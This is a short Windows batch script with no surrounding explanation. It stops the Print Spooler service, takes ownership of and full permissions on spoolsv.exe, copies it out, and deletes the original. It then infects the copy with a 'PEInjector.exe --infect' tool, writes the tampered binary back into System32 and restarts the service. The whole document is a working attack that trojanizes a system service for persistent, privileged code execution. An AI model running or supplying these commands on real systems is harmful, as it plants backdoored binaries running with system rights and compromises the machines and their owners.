sc stop spooler
takeown /f C:\Windows\System32\spoolsv.exe
echo y| cacls C:\Windows\System32\spoolsv.exe /G %username%:F
echo f| xcopy C:\Windows\System32\spoolsv.exe %TEMP%\spoolsv.exe /f
del C:\windows\system32\spoolsv.exe
PEInjector.exe --infect %TEMP%\spoolsv.exe
echo f| xcopy %TEMP%\spoolsv.exe C:\windows\system32\spoolsv.exe /f
sc start spooler